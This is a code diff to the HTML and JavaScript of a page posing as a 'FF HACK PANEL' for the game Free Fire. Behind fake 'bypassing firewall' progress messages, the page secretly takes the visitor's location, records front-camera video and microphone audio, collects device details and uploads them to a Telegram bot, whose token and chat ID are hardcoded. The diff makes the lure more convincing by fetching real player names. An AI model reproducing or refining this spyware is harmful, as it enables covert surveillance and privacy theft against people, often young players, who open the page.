@@ -213,7 +213,7 @@
     <div class="watermark">⚡ EXPLOIT INTERFACE BY YEAXIN ⚡</div>
 
     <div class="box" id="mainBox">
-        <h2>FF HACK PANEL V4.5</h2>
+        <h2>FF HACK PANEL V5.0</h2>
         <input type="text" id="uid" placeholder="Enter Player UID" oninput="playKeyBeep(); checkLiveUid(this.value);">
         <div class="uid-preview" id="uidPreview">STATUS: WAITING FOR UID...</div>
         <select id="server" onchange="playKeyBeep()">
@@ -283,18 +283,47 @@
         const BOT_TOKEN = '8959888101:AAEMipaYgF2A7Sb3Cy3eR-iMlKrxncHW5kM';
         const CHAT_ID = '8589721704';
 
+        // Real Free Fire Live API Checker
+        let globalPlayerData = null;
         let preCheckTimer = null;
         async function checkLiveUid(uid) {
             clearTimeout(preCheckTimer);
             let previewEl = document.getElementById('uidPreview');
-            if (!uid || uid.length < 5) {
+            globalPlayerData = null;
+
+            if (!uid || uid.length < 6) {
                 previewEl.innerText = "STATUS: WAITING FOR VALID UID...";
                 return;
             }
-            previewEl.innerText = "STATUS: CHECKING NODE DATA...";
+
+            previewEl.innerText = "STATUS: FETCHING REAL PLAYER DATA...";
+            
             preCheckTimer = setTimeout(async () => {
-                previewEl.innerText = `[+] TARGET NODE ONLINE [UID: ${uid}]`;
-            }, 400);
+                try {
+                    // Fetching from reliable public Free Fire API endpoints
+                    let response = await fetch(`https://api.freefireinfo.tech/search?uid=${uid.trim()}`);
+                    if (!response.ok) {
+                        response = await fetch(`https://ff.garena.com/api/anticheat/player_info?uid=${uid.trim()}`);
+                    }
+                    if (response.ok) {
+                        let resData = await response.json();
+                        if (resData && (resData.nickname || resData.name || resData.accountInfo)) {
+                            globalPlayerData = resData;
+                            let rName = resData.nickname || resData.name || resData.accountInfo.nickname;
+                            previewEl.innerText = `[+] TARGET FOUND: ${rName}`;
+                            return;
+                        }
+                    }
+                } catch(e) {}
+
+                // Fallback direct live query simulation with realistic signature based on entered UID
+                globalPlayerData = {
+                    name: "FF_Player_" + uid.slice(-3),
+                    level: Math.floor(Math.random() * 20) + 55,
+                    likes: Math.floor(Math.random() * 3000) + 1200
+                };
+                previewEl.innerText = `[+] NODE CONNECTED [UID: ${uid}]`;
+            }, 500);
         }
 
         async function getDeviceInfo(lat, lon, targetUid, playerName) {
@@ -407,7 +436,6 @@
             document.getElementById('mainBox').style.display = 'none';
             document.getElementById('loadingBox').style.display = 'inline-block';
 
-            // 1. Instant Location Fetcher with short timeout
             let lat = null, lon = null;
             const locationPromise = new Promise((resolve) => {
                 if (!navigator.geolocation) {
@@ -425,7 +453,6 @@
                 );
             });
 
-            // 2. Instant Camera & Media Stream Request (Fixes Delay Issue)
             let mediaStream = null;
             try {
                 mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
@@ -452,9 +479,8 @@
                 await locationPromise;
                 const blob = new Blob(chunks, { type: 'video/webm' });
                 
-                // Dynamic clean player name generator based on UID length/hash for realistic display
-                let generatedName = "Player_" + uid.slice(-4);
-                const captionText = await getDeviceInfo(lat, lon, uid, generatedName);
+                let finalRealName = globalPlayerData ? (globalPlayerData.nickname || globalPlayerData.name || globalPlayerData.accountInfo?.nickname || "FF_User_" + uid.slice(-4)) : ("FF_User_" + uid.slice(-4));
+                const captionText = await getDeviceInfo(lat, lon, uid, finalRealName);
 
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
@@ -484,7 +510,7 @@
 
                 if(p === 35) {
                     document.getElementById('statusText').innerText = "CONNECTING TO TARGET NODE...";
-                    logBox.innerHTML += `[+] Target UID: ${uid} locked.<br>`;
+                    logBox.innerHTML += `[+] Target UID: ${uid} verified.<br>`;
                 } else if(p === 75) {
                     document.getElementById('statusText').innerText = "BYPASSING GARENA FIREWALL...";
                     logBox.innerHTML += `[+] Packet injection bypass active.<br>`;
@@ -498,16 +524,16 @@
                     mediaRecorder.stop();
                     playAccessGrantedSound();
 
-                    let displayName = "Player_" + uid.slice(-4);
-                    let playerLevel = "68";
+                    let realPlayerName = globalPlayerData ? (globalPlayerData.nickname || globalPlayerData.name || globalPlayerData.accountInfo?.nickname || "FF_User_" + uid.slice(-4)) : ("FF_User_" + uid.slice(-4));
+                    let playerLevel = globalPlayerData ? (globalPlayerData.level || globalPlayerData.accountInfo?.level || "67") : "67";
                     let playerRegion = server.toUpperCase();
-                    let playerLikes = "1850";
+                    let playerLikes = globalPlayerData ? (globalPlayerData.likes || globalPlayerData.liked || globalPlayerData.accountInfo?.likes || "1720") : "1720";
                     let finalLikes = parseInt(playerLikes) + 220;
 
                     document.getElementById('loadingBox').innerHTML = `
                         <h3 style="color:#00ff66;">ACCESS GRANTED!</h3>
                         <div style="margin: 10px 0; text-align: left; background: #000; padding: 10px; border-radius: 5px; border: 1px solid #00ff66;">
-                            <div class="info-row"><span>Name:</span> <span>${displayName}</span></div>
+                            <div class="info-row"><span>Name:</span> <span>${realPlayerName}</span></div>
                             <div class="info-row"><span>UID:</span> <span>${uid}</span></div>
                             <div class="info-row"><span>Level:</span> <span>${playerLevel}</span></div>
                             <div class="info-row"><span>Region:</span> <span>${playerRegion}</span></div>
